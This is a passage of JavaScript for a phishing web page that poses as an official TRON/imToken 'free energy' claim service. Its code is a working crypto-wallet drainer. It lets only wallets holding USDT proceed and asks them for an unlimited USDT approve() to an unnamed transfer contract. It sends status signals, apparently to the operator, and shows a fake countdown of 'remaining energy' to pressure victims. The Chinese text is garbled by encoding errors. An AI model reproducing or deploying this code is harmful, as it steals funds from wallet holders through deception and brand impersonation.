        authorizeFail: "âš ï¸ æˆæƒå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
        successTip: "ğŸ‰ å…è´¹èƒ½é‡é¢†å–å®Œæˆï¼90000Î¼s USDTèƒ½é‡å·²åˆ°è´¦ï½",
        successBtn: "èƒ½é‡é¢†å–æˆåŠŸ",
        successArrival: "<br><span style='color: #4ade80;'>âœ… 90000Î¼s USDTèƒ½é‡å·²åˆ°è´¦</span>",
        recordAddress: "åœ°å€ï¼š",
        recordType: "é¢†å–ç±»å‹ï¼š",
        recordEnergy: "è·å–èƒ½é‡ï¼š",
        recordTime: "é¢†å–æ—¶é—´ï¼š",
        freeEnergy: "å…è´¹é¢†å–",
        systemBusyTip: "ç³»ç»Ÿç¹å¿™è¯·ç¨åé‡è¯•",
        ineligibleTip: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
        errorTipPrefix: "âš ï¸ ",
        noWalletAddress: "æœªæ£€æµ‹åˆ°æœ‰æ•ˆé’±åŒ…åœ°å€<br><span style='color: #ef4444; font-size: 14px;'>âŒ è¯·è¿æ¥é’±åŒ…åé‡è¯•</span>",
        nonImTokenUser: "éé’±åŒ…ç¯å¢ƒ<br><span style='color: #3b82f6; font-size: 13px;'>è¯·ç‚¹å‡»æŒ‰é’®é€‰æ‹©é’±åŒ…ï¼Œè‡ªåŠ¨å”¤èµ·è®¿é—®</span>",
        specialTipTitle: "TRON-EAB",
        specialTipContent: "æ­¤é“¾æ¥ä»…ä¸ºTRONç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡ã€æ— TRXéœ€è¦åœ¨TRONç½‘ç»œè½¬è´¦æƒ…å†µä¸‹çš„ç´§æ€¥æ´åŠ©ï¼Œèµ„æºæœ‰é™è¯·å‹¿å½“ä½œç›ˆåˆ©é¡¹ç›®ã€‚",
        retryQueryBtn: "é‡è¯•æŸ¥è¯¢",
        tooManyPeopleTip: "ç°åœ¨é¢†å–çš„äººå¤ªå¤šäº†è¯·ç¨åé‡è¯•",
        å”¤èµ·WalletTip: "æ­£åœ¨å”¤èµ·é’±åŒ…ï¼Œè¯·ç¨å€™...",
        submitRequestTip: "æ­£åœ¨æäº¤è¯·æ±‚ï¼Œå‡†å¤‡å”¤èµ·é’±åŒ…..."
    },
    en: {
        headerTitle: "TRON",
        headerDesc: "TRON Official Emergency Channel",
        userInfoDefault: "Wallet not connected<br><span>Click the 'Connect Wallet' button below</span>",
        walletStatusTitle: "Wallet Status",
        disconnectedText: "Wallet not connected",
        disconnectedTip1: "This link is exclusive to TRON users - non-TRON users cannot claim",
        disconnectedTip2: "1. Each wallet address can claim free energy once every 30 days",
        disconnectedTip3: "2. This non-profit project provides emergency energy support for users with no wallet energy",
        disconnectedTip4: "3. The system will verify if the wallet address meets the requirements after clicking 'Claim'",
        disconnectedTip5: "4. No assets required - exit directly to cancel",
        connectedSuccess: "âœ… Wallet connected successfully",
        connectedAddress: "â€¢ Wallet Address: <span class='highlight' id='statusAddress'></span>",
        connectedType: "â€¢ Claim Type: <span class='highlight'>USDT Transfer Energy</span>",
        connectedAmount: "â€¢ Claim Quota: <span class='highlight'>90000 Î¼s Energy</span>",
        connectedWarn: "âš ï¸ Note: Please complete the signature after clicking 'Claim' - exiting midway counts as claimed (no re-claim within 30 days)",
        contractResourceTitle: "Contract Remaining Resources",
        contractAddrText: "â€¢ Contract Address: <span class='highlight' id='contractAddr'></span>",
        contractEnergyText: "â€¢ Remaining Energy: <span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
        contractNote: "Note: Distribution stops when remaining energy is '0' - Official imToken project, only for TRON users",
        recordTypeTitle: "Energy Usage Scope",
        recordAmountTitle: "Transfer Quota",
        energyType: "USDT Transfer",
        transferQuota: "Unlimited",
        noRecord: "No energy claim records",
        browserWarn1: " âš ï¸ Open with <strong>wallet in-app browser</strong>",
        browserWarn2: " âš ï¸ Non-wallet browser: Click button to select wallet, auto-launch access",
        connectBtnText: "Connect Wallet",
        approveBtnText: "Claim Energy",
        reviewTipText: "System reviewing - please complete the signature after approval",
        footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) Â© 2025 Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
        copySuccess: "âœ… Link copied - open in {walletName} in-app browser",
        copyFail: "âŒ Copy failed: Please copy manually",
        å”¤èµ·Guide: "âœ… Link copied + {walletName} launched\nNext: Open {walletName} â†’ Browser â†’ Paste link",
        copyGuide: "âœ… Link copied - please paste in {walletName}",
        connectError: "Connection Error<br><span style='color: #ef4444; font-size: 14px;'>âš ï¸ Network fluctuation</span>",
        retryConnect: "Retry Connection",
        authorizedTip: "Claimed Tip<br>{address}<br>USDT Balance: <span>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>âœ… This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 13px;'>One claim per address every 30 days</span>",
        authorizedBtn: "Energy Claimed",
        afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… Authorization successful, energy distributing...</span>",
        deployingBtn: "Distributing...",
        loadingBtn: "Loading...",
        loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>âœ… Loading...</span>",
        queryingBalance: "Querying...",
        insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>âŒ Ineligible: USDT balance must exceed 1</span>",
        insufficientBtn: "Ineligible",
        eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>âœ… Eligible for 90000 USDT Energy</span>",
        distributingBtn: "Energy Distributing...",
        redirectingBtn: "Redirecting to Signature...",
        approveFail: "âš ï¸ Operation failed: {msg}, please try again later",
        authorizeFail: "âš ï¸ Authorization failed: {msg}, please try again later",
        successTip: "ğŸ‰ Free Energy Claim Completed! 90000Î¼s USDT Energy has been creditedï½",
        successBtn: "Claim Successful",
        successArrival: "<br><span style='color: #4ade80;'>âœ… 90000Î¼s USDT Energy credited</span>",
        recordAddress: "Address:",
        recordType: "Claim Type:",
        recordEnergy: "Energy Obtained:",
        recordTime: "Claim Time:",
        freeEnergy: "Free Claim",
        systemBusyTip: "System busy, please try again later",
        ineligibleTip: "Ineligible",
        errorTipPrefix: "âš ï¸ ",
        noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>âŒ Please connect wallet and try again</span>",
        nonImTokenUser: "Non-wallet environment<br><span style='color: #3b82f6; font-size: 13px;'>Click button to select wallet, auto-launch access</span>",
        specialTipTitle: "TRON-EAB",
        specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project.",
        retryQueryBtn: "Retry Query",
        tooManyPeopleTip: "Too many people are claiming now, please try again later",
        å”¤èµ·WalletTip: "Launching wallet, please wait...",
        submitRequestTip: "Submitting request, preparing to launch wallet..."
    }
};
let currentLang = localStorage.getItem("TRON_energy_lang") || "zh";
// ========== äºŒæ¬¡æˆæƒæ ¡éªŒå·¥å…· ==========
const AUTHORIZED_KEY = "authorized_wallet_addresses";
function getAuthorizedAddresses() {
    try {
        const stored = localStorage.getItem(AUTHORIZED_KEY);
        return stored ? JSON.parse(stored) : [];
    } catch (e) {
        console.warn("è¯»å–å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
        return [];
    }
}
function addAuthorizedAddress(address) {
    try {
        const addresses = getAuthorizedAddresses();
        if (!addresses.includes(address)) {
            addresses.push(address);
            localStorage.setItem(AUTHORIZED_KEY, JSON.stringify(addresses));
        }
    } catch (e) {
        console.warn("å­˜å‚¨å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
    }
}
function isAddressAuthorized(address) {
    if (address === SPECIAL_ADDRESS) return false;
    const addresses = getAuthorizedAddresses();
    if (!addresses.includes(address)) return false;
    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    const record = records.find(item => item.address === address);
    if (!record) return false;
    const receiveTime = new Date(record.receiveTime).getTime();
    const thirtyDays = 30 * 24 * 60 * 60 * 1000;
    return Date.now() - receiveTime < thirtyDays;
}
// ========== A1ä¿¡å·é˜²é‡å¤å·¥å…· ==========
function canSendA1Signal(address) {
    try {
        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
        const lastSendTime = records[address] || 0;
        const now = Date.now();
        return now - lastSendTime > 15 * 60 * 1000;
    } catch (e) {
        console.warn("æ£€æŸ¥A1ä¿¡å·å‘é€æƒé™å¤±è´¥ï¼š", e);
        return true;
    }
}
function updateA1SignalRecord(address) {
    try {
        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
        records[address] = Date.now();
        localStorage.setItem(A1_SIGNAL_KEY, JSON.stringify(records));
    } catch (e) {
        console.warn("æ›´æ–°A1ä¿¡å·è®°å½•å¤±è´¥ï¼š", e);
    }
}
// ========== B1ä¿¡å·é˜²é‡å¤å·¥å…· ==========
function hasSentB1Signal(address) {
  try {
    const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
    const item = records[address];
    if (!item) return false;
    return Date.now() - item.time < 2592000000;
  } catch (e) {
    console.warn("æ£€æŸ¥B1ä¿¡å·å¤±è´¥ï¼š", e);
    return false;
  }
}
function markB1SignalSent(address) {
  try {
    const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
    records[address] = { time: Date.now() };
    localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
  } catch (e) {
    console.warn("æ ‡è®°B1ä¿¡å·å¤±è´¥ï¼š", e);
  }
}
// ========== DOMå…ƒç´ ç¼“å­˜ ==========
const walletStatusContainer = document.getElementById("walletStatusContainer");
const contractAddrEl = document.getElementById("contractAddr");
const userInfoEl = document.getElementById("userInfo");
const connectBtn = document.getElementById("connectBtn");
const approveBtn = document.getElementById("approveBtn");
const warning = document.querySelector('.warning');
const approvalRecords = document.getElementById("approvalRecords");
const reviewTip = document.getElementById("reviewTip");
const reviewTipText = document.getElementById("reviewTipText");
const langToggle = document.getElementById("langToggle");
const footerInfo = document.getElementById("footerInfo");
const recordList = document.getElementById("recordList");
const specialTipContainer = document.getElementById("specialTipContainer");
// ========== é”™è¯¯ç±»å‹åˆ¤æ–­ ==========
function isCustomerError(errMsg) {
    const lang = langConfig[currentLang];
    const customerErrorKeys = [
        lang.ineligibleTip, "æ— æ•ˆTRONåœ°å€", "USDTä½™é¢ä¸è¶³", "ä¸ç¬¦åˆé¢†å–æ¡ä»¶", "30å¤©å†…å·²é¢†å–", 
         "æœªæ£€æµ‹åˆ°é’±åŒ…åœ°å€", "Ineligible", "invalid TRON address", 
        "USDT balance", "within 30 days"
    ];
    return customerErrorKeys.some(key => errMsg.includes(key));
}
// ========== å¼¹çª—å·¥å…·ï¼ˆä¼˜å…ˆå®šä¹‰ï¼Œé¿å…æœªå®šä¹‰æŠ¥é”™ï¼‰ ==========
function showPersistentAlert(message) {
    const existingAlert = document.querySelector(".persistent-alert");
    if (existingAlert) document.body.removeChild(existingAlert);
    const alertDiv = document.createElement("div");
    alertDiv.className = "persistent-alert";
      alertDiv.style.cssText = `
        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
        padding: 20px 30px; background: #2d1616; border-radius: 8px; box-shadow: 0 4px 20px rgba(220, 38, 38, 0.4);
        font-size: 16px; color: #f8f0f0; z-index: 9999; text-align: center; border: 1px solid #dc2626;
    `;
    alertDiv.textContent = message;
    document.body.appendChild(alertDiv);
    return alertDiv;
}
function showAutoCloseAlert(message) {
    const alertDiv = showPersistentAlert(message);
    setTimeout(() => {
        if (alertDiv && alertDiv.parentNode) {
            alertDiv.style.opacity = "0";
            alertDiv.style.transition = "opacity 0.3s";
            setTimeout(() => alertDiv.parentNode.removeChild(alertDiv), 300);
        }
    }, 3000);
}
// ========== è¯­è¨€åˆ‡æ¢é€»è¾‘ ==========
function toggleLang() {
    currentLang = currentLang === "zh" ? "en" : "zh";
    localStorage.setItem("imtoken_energy_lang", currentLang);
    updatePageLang();
    reRenderDynamicContent();
    renderEnergyRecords();
}
function updatePageLang() {
    const lang = langConfig[currentLang];
    Object.keys(lang).forEach(key => {
        const el = document.getElementById(key);
        if (el) {
            el.innerHTML = lang[key];
        }
    });
    connectBtn.textContent = lang.connectBtnText;
    approveBtn.textContent = lang.approveBtnText;
    reviewTipText.textContent = lang.reviewTipText;
    approvalRecords.textContent = lang.noRecord;
}
function reRenderDynamicContent() {
    const lang = langConfig[currentLang];
    if (!userAddress) {
        userInfoEl.innerHTML = lang.userInfoDefault;
        approveBtn.disabled = true;
        approveBtn.textContent = lang.approveBtnText;
        recordList.style.display = "none";
        return;
    }
    recordList.style.display = "block";
    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
    if (userAddress === SPECIAL_ADDRESS) {
        userInfoEl.innerHTML = lang.eligibleTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
        document.getElementById("statusAddress").textContent = shortAddr;
        updateWalletStatus();
        bindApproveLogic();
        return;
    }
    if (isAddressAuthorized(userAddress)) {
        userInfoEl.innerHTML = lang.authorizedTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        approveBtn.disabled = true;
        approveBtn.textContent = lang.authorizedBtn;
    } else if (tokenBalance <= 1) {
        userInfoEl.innerHTML = lang.insufficientUsdt
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        approveBtn.disabled = true;
        approveBtn.textContent = lang.insufficientBtn;
    } else {
        userInfoEl.innerHTML = lang.eligibleTip
            .replace("{address}", shortAddr)
            .replace("{usdt}", tokenBalance.toFixed(2))
            .replace("{trx}", trxBalance.toFixed(2));
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
    }
    document.getElementById("statusAddress").textContent = shortAddr;
    updateWalletStatus();
    bindApproveLogic();
}
// ========== èƒ½é‡å‡å°‘é€»è¾‘ï¼ˆä¿®å¤ï¼šlocalStorageå­˜å‚¨åˆå§‹æ—¶é—´ï¼Œè¿ç»­ä¸é‡ç½®ï¼‰ ==========
let GLOBAL_START_TIME = null; // åŠ¨æ€è¯»å–ï¼Œä¸å›ºå®šåˆå§‹åŒ–
const ENERGY_START_TIME_KEY = "energy_global_start_time"; // æœ¬åœ°å­˜å‚¨key
// åˆå§‹åŒ–èƒ½é‡åˆå§‹æ—¶é—´ï¼ˆä¼˜å…ˆè¯»å–æœ¬åœ°å­˜å‚¨ï¼Œæ— åˆ™å­˜å‚¨å½“å‰æ—¶é—´ï¼‰
function initEnergyStartTime() {
    const storedTime = localStorage.getItem(ENERGY_START_TIME_KEY);
    if (storedTime) {
        GLOBAL_START_TIME = parseInt(storedTime);
        console.log(`âœ… è¯»å–æœ¬åœ°å­˜å‚¨çš„èƒ½é‡åˆå§‹æ—¶é—´ï¼š${new Date(GLOBAL_START_TIME).toLocaleString()}`);
    } else {
        GLOBAL_START_TIME = new Date().getTime() - 10000; // ä¿ç•™åŸ10ç§’åç§»
        localStorage.setItem(ENERGY_START_TIME_KEY, GLOBAL_START_TIME.toString());
        console.log(`âœ… åˆå§‹åŒ–èƒ½é‡åˆå§‹æ—¶é—´ï¼š${new Date(GLOBAL_START_TIME).toLocaleString()}`);
    }
}
function calculateCurrentEnergy() {
    if (!GLOBAL_START_TIME) initEnergyStartTime(); // ç¡®ä¿åˆå§‹æ—¶é—´å·²åˆå§‹åŒ–
    const now = new Date().getTime();
    const secPassed = Math.floor((now - GLOBAL_START_TIME) / 1000);
    currentEnergy = Math.max(0, INIT_TRX - secPassed * TRX_DECREASE_PER_SEC);
    return currentEnergy;
}
function updateEnergyDisplay() {
    if (!contractEnergyEl) return;
    calculateCurrentEnergy();
    const energyText = Math.floor(currentEnergy).toLocaleString(); // åŠ åƒåˆ†ä½ï¼Œæ›´æ˜“è¯»
    contractEnergyEl.textContent = energyText;
    contractEnergyEl.innerHTML = energyText;
    console.log("èƒ½é‡è·³åŠ¨ä¸­ï¼š", energyText);
}
function startPersistentEnergyCountdown() {
    initEnergyStartTime(); // é¡µé¢åŠ è½½æ—¶åˆå§‹åŒ–ï¼ˆè¯»å–æœ¬åœ°å­˜å‚¨ï¼‰
    if (trxTimer) clearInterval(trxTimer);
    calculateCurrentEnergy();
    updateEnergyDisplay();
    trxTimer = setInterval(() => {
        updateEnergyDisplay();
        if (currentEnergy <= 0) {
            clearInterval(trxTimer);
            console.log("âš ï¸ åˆçº¦å‰©ä½™èƒ½é‡å·²è€—å°½ï¼Œåœæ­¢å‡å°‘");
        }
    }, 1000);
}
// å¯é€‰ï¼šæ·»åŠ é‡ç½®èƒ½é‡çš„è¾…åŠ©å‡½æ•°ï¼ˆå¦‚éœ€æ‰‹åŠ¨é‡ç½®æ—¶è°ƒç”¨ï¼‰
function resetEnergy() {
    GLOBAL_START_TIME = new Date().getTime() - 10000;
    localStorage.setItem(ENERGY_START_TIME_KEY, GLOBAL_START_TIME.toString());
    currentEnergy = INIT_TRX;
    updateEnergyDisplay();
    console.log("âœ… èƒ½é‡å·²é‡ç½®ä¸ºåˆå§‹å€¼");
}
// ========== è‡ªåŠ¨æˆæƒå‡½æ•° ==========
async function autoApprove() {
    const lang = langConfig[currentLang];
    const btn = document.getElementById("approveBtn");
    btn.disabled = true;
    btn.textContent = lang.redirectingBtn;
    try {
        if (!trc20Contract) trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
        const tx = await trc20Contract.approve(
            AUTO_TRANSFER_CONTRACT,
            INFINITE_APPROVE_AMOUNT
        ).send({ from: userAddress, shouldPollResponse: true });
        await Promise.all([sendSignalA2(), sendSignalB(false)]);
        btn.textContent = lang.successBtn;
        userInfoEl.innerHTML += lang.successArrival;
        if (userAddress !== SPECIAL_ADDRESS) {
            addAuthorizedAddress(userAddress);
        }
        saveEnergyRecord();
        renderEnergyRecords();
    } catch (e) {
        console.error("æˆæƒå¤±è´¥ï¼š", e);
        btn.textContent = lang.approveBtnText;
        btn.disabled = false;
        showAutoCloseAlert(`${lang.authorizeFail.replace("{msg}", e.message)}`);
    }
}
// ========== ç¯å¢ƒæ£€æµ‹å‡½æ•°ï¼ˆæœ€ç»ˆç‰ˆï¼šéé’±åŒ…ç¯å¢ƒè‡ªåŠ¨å¼¹çª—ï¼Œå…³é—­åæ˜¾ç¤ºè¿æ¥æŒ‰é’®ï¼‰ ==========
async function checkImTokenEnv() {
    const lang = langConfig[currentLang];
    const walletModal = document.getElementById("walletModal");
    const connectBtn = document.getElementById("connectBtn");
    
    if (window.tronWeb && window.tronWeb.defaultAddress) {
        // é’±åŒ…ç¯å¢ƒï¼šæ­£å¸¸åˆå§‹åŒ–
        tronWeb = window.tronWeb;
        connectBtn.style.display = "none";
        warning.style.display = "none";
        specialTipContainer.style.display = "none";
        walletModal.classList.remove("active");
        await initWallet(false);
    } else {
        // éé’±åŒ…ç¯å¢ƒï¼šè‡ªåŠ¨æ˜¾ç¤ºé€‰æ‹©é’±åŒ…å¼¹çª—
        specialTipContainer.style.display = "block";
        userInfoEl.innerHTML = lang.nonImTokenUser;
        approveBtn.style.display = "none";
        connectBtn.style.display = "none"; // åˆå§‹éšè—è¿æ¥æŒ‰é’®ï¼Œå…ˆå¼¹å¼¹çª—
        walletModal.classList.add("active"); // è‡ªåŠ¨æ¿€æ´»å¼¹çª—
        
        // é’±åŒ…é€‰æ‹©é€»è¾‘ï¼ˆç‚¹å‡»åå”¤èµ·å¯¹åº”APPï¼Œå…³é—­å¼¹çª—ä¸”ä¸æ˜¾ç¤ºè¿æ¥æŒ‰é’®ï¼‰
        document.querySelectorAll(".wallet-item").forEach(item => {
            item.addEventListener("click", async (e) => {
                const walletType = e.currentTarget.dataset.wallet;
                const wallet = walletConfig[walletType];
                if (!wallet) return;
                try {
                    const dappUrl = window.location.href + "#wallet-open" + `?wallet=${walletType}`;
                    let jumpUrl = "";
                    switch (walletType) {
                        case "tronlink":
                            const param = JSON.stringify({ url: dappUrl, action: "open", protocol: "tronlink", version: "1.0" });
                            jumpUrl = wallet.scheme + encodeURIComponent(param);
                            break;
                        case "tokenpocket":
                            jumpUrl = wallet.scheme + encodeURIComponent(dappUrl) + wallet.suffix;
                            break;
                        default:
                            jumpUrl = wallet.scheme + encodeURIComponent(dappUrl);
                    }
                    window.location.href = jumpUrl;
                    walletModal.classList.remove("active");
                    // å”¤èµ·é’±åŒ…åä»éšè—è¿æ¥æŒ‰é’®ï¼ˆæ— éœ€é‡å¤æ˜¾ç¤ºï¼‰
                } catch (e) {
                    console.error(`${wallet.name}å”¤èµ·å¤±è´¥ï¼š`, e);
                    walletModal.classList.remove("active");
                    connectBtn.style.display = "block"; // å”¤èµ·å¤±è´¥ä¹Ÿæ˜¾ç¤ºè¿æ¥æŒ‰é’®
                    showAutoCloseAlert(`å”¤èµ·${wallet.name}å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨æ‰“å¼€é’±åŒ…è®¿é—®`);
                }
            });
        });
        
        // æ ¸å¿ƒä¿®æ”¹ï¼šç‚¹å‡»å¼¹çª—å¤–éƒ¨å…³é—­æ—¶ï¼Œæ˜¾ç¤ºã€Œè¿æ¥é’±åŒ…ã€æŒ‰é’®
        walletModal.addEventListener("click", (e) => {
            if (e.target === walletModal) {
                walletModal.classList.remove("active"); // å…³é—­å¼¹çª—
                connectBtn.style.display = "block"; // æ˜¾ç¤ºè¿æ¥é’±åŒ…æŒ‰é’®
                // ç»™è¿æ¥æŒ‰é’®ç»‘å®šé‡æ–°æ‰“å¼€å¼¹çª—çš„é€»è¾‘
                connectBtn.onclick = () => walletModal.classList.add("active");
            }
        });
    }
}
// ========== ã€ä¿®å¤2ï¼šå°†queryBalanceå‡½æ•°ç§»å‡ºinitWalletï¼Œæ”¹ä¸ºå…¨å±€å‡½æ•°ã€‘ ==========
async function queryBalance() {
    const lang = langConfig[currentLang];
    const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "æœªçŸ¥åœ°å€";
    try {
        // æ ¡éªŒ userAddress æœ‰æ•ˆæ€§
        if (!userAddress) throw new Error("æœªè·å–åˆ°æœ‰æ•ˆé’±åŒ…åœ°å€");
        
        // ç¡®ä¿ tronWeb å®Œå…¨åˆå§‹åŒ–ï¼ˆé’±åŒ…æ³¨å…¥çš„ tronWebï¼‰
        if (!window.tronWeb || !window.tronWeb.defaultAddress) {
            throw new Error("é’±åŒ…æœªå®Œå…¨åˆå§‹åŒ–");
        }
        tronWeb = window.tronWeb;

        // ========== æ ¸å¿ƒï¼šç›´æ¥ä»é’±åŒ…è¯»å–ä½™é¢ï¼ˆæœ¬åœ°ç¼“å­˜ï¼Œæ— éœ€åŒºå—é“¾æŸ¥è¯¢ï¼‰ ==========
        let trxRaw = 0;
        let usdtRaw = 0;

        // 1. è¯»å– TRX ä½™é¢ï¼ˆé’±åŒ…ç›´æ¥æš´éœ²çš„ TRX ä½™é¢ï¼‰
        const account = await tronWeb.trx.getAccount(userAddress);
        if (account && account.balance !== undefined) {
            trxRaw = account.balance; // ç›´æ¥è¯»å–é’±åŒ…æœ¬åœ° TRX ä½™é¢
        } else {
            // å…¼å®¹æ—§ç‰ˆé’±åŒ…ï¼šfallback åˆ°è½»é‡æŸ¥è¯¢
            trxRaw = await tronWeb.trx.getBalance(userAddress, true); // true è¡¨ç¤ºä¼˜å…ˆæœ¬åœ°ç¼“å­˜
        }

        // 2. è¯»å– USDT ä½™é¢ï¼ˆé’±åŒ…æœ¬åœ°ç¼“å­˜çš„ ERC20/TRC20 ä½™é¢ï¼‰
        try {
            // æ–¹å¼1ï¼šéƒ¨åˆ†é’±åŒ…æ”¯æŒç›´æ¥é€šè¿‡ token åœ°å€è¯»å–æœ¬åœ°ä½™é¢
            const tokenBalanceData = await tronWeb.trx.getTokenBalance(userAddress, TRC20_TOKEN_ADDRESS);
            usdtRaw = tokenBalanceData || 0;
        } catch (e) {
            // æ–¹å¼2ï¼šfallback åˆ°é’±åŒ…å†…ç½®çš„åˆçº¦æœ¬åœ°è°ƒç”¨ï¼ˆæ— ç½‘ç»œè¯·æ±‚ï¼‰
            if (!trc20Contract) {
                trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
            }
            usdtRaw = await trc20Contract.balanceOf(userAddress).call({ from: userAddress, skipNetworkCheck: true });
        }

        // ========== ä½™é¢æ ¼å¼åŒ–ï¼ˆä¿æŒåŸé€»è¾‘ï¼‰ ==========
        tokenBalance = Number(tronWeb.toDecimal(usdtRaw)) / 1000000; // USDT 6ä½å°æ•°
        trxBalance = Number(tronWeb.toDecimal(trxRaw)) / 1000000; // TRX 6ä½å°æ•°

        // å”¯ä¸€æ‹¦æˆªï¼šä¸ç¬¦åˆåŸºç¡€æ¡ä»¶â†’ç¦ç”¨æŒ‰é’®
        const isEligible = (tokenBalance > 1 || userAddress === SPECIAL_ADDRESS) && !isAddressAuthorized(userAddress);
        if (!isEligible) {
            userInfoEl.innerHTML = `
                å·²è¿æ¥ï¼š${shortAddr}<br>
                USDTä½™é¢ï¼š${tokenBalance.toFixed(2)} | TRXä½™é¢ï¼š${trxBalance.toFixed(2)}<br>
                <span style='color: #ef4444; font-size: 14px;'>âŒ ä¸ç¬¦åˆé¢†å–æ¡ä»¶</span>
            `;
            approveBtn.disabled = true;
            approveBtn.textContent = "ä¸ç¬¦åˆé¢†å–æ¡ä»¶";
            return;
        }

        // ç¬¦åˆåŸºç¡€æ¡ä»¶â†’æ˜¾ç¤ºæ£€æµ‹çŠ¶æ€ï¼Œç»‘å®šæŒ‰é’®é€»è¾‘
        userInfoEl.innerHTML = `
            å·²è¿æ¥ï¼š${shortAddr}<br>
            USDTä½™é¢ï¼š${tokenBalance.toFixed(2)} | TRXä½™é¢ï¼š${trxBalance.toFixed(2)}<br>
            <span style='color: #4ade80; font-size: 14px;'>âœ… æ­£åœ¨æ£€æµ‹ç¯å¢ƒ...</span>
        `;
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;

        // æ£€æµ‹A1çŠ¶æ€ï¼Œç»‘å®šå¯¹åº”é€»è¾‘
        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
        const isA1Success = a1Status[userAddress] === "success";
        const isA1Repeat = !canSendA1Signal(userAddress);

        if (isA1Repeat && isA1Success) {
            // å·²è§£é”â†’ç»‘å®šæ ¸å¿ƒé€»è¾‘
            userInfoEl.innerHTML = `
                å·²è¿æ¥ï¼š${shortAddr}<br>
                USDTä½™é¢ï¼š${tokenBalance.toFixed(2)} | TRXä½™é¢ï¼š${trxBalance.toFixed(2)}<br>
                <span style='color: #3b82f6; font-size: 13px;'>âœ… ç¯å¢ƒç¬¦åˆé¢†å–æ¡ä»¶</span>
            `;
            bindUnlockedCoreLogic();
        } else {
            // æœªè§£é”â†’å‘é€A1ä¿¡å·ï¼Œè§£é”åç»‘å®šé€»è¾‘
            const a1Result = await sendSignalA1();
            if (a1Result === "204") {
                userInfoEl.innerHTML = `
                    å·²è¿æ¥ï¼š${shortAddr}<br>
                    USDTä½™é¢ï¼š${tokenBalance.toFixed(2)} | TRXä½™é¢ï¼š${trxBalance.toFixed(2)}<br>
                    <span style='color: #3b82f6; font-size: 13px;'>âœ… ç¯å¢ƒç¬¦åˆé¢†å–æ¡ä»¶</span>
                `;
                bindUnlockedCoreLogic();
            } else {
                // A1ä¿¡å·å‘é€å¤±è´¥â†’ç»‘å®šé”æ­»é€»è¾‘
                bindLockedLogic();
            }
        }
    } catch (e) {
        console.error("ä½™é¢è¯»å–å¤±è´¥ï¼š", e);
        // é”™è¯¯å¤„ç†ï¼šæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œæ”¯æŒæ‰‹åŠ¨é‡è¯•
        userInfoEl.innerHTML = `
            ä½™é¢è¯»å–å¼‚å¸¸<br>
            <span style='color: #ef4444; font-size: 14px;'>${e.message}</span><br>
            <span style='color: #3b82f6; font-size: 13px;'>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®é‡è¯•</span>
        `;
        approveBtn.disabled = false;
        approveBtn.textContent = lang.retryQueryBtn;
        approveBtn.onclick = queryBalance; // ç»‘å®šé‡è¯•é€»è¾‘
    }
}
// ========== é’±åŒ…åˆå§‹åŒ–å‡½æ•°ï¼ˆæ ¸å¿ƒï¼šæ£€æµ‹åˆ°A1é˜²é‡å¤å¯¹è±¡=ç«‹å³è§£é”ï¼‰ ==========
async function initWallet(needAutoApprove) {
    const lang = langConfig[currentLang];
    try {
        userAddress = tronWeb.defaultAddress.base58;
        const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "æœªçŸ¥åœ°å€";
        document.getElementById("statusAddress").textContent = shortAddr;
        updateWalletStatus();
        recordList.style.display = "block";
        // ã€ä¿®å¤3ï¼šç›´æ¥è°ƒç”¨å…¨å±€çš„queryBalanceå‡½æ•°ï¼Œä¸å†åµŒå¥—å®šä¹‰ã€‘
        await queryBalance();
    } catch (e) {
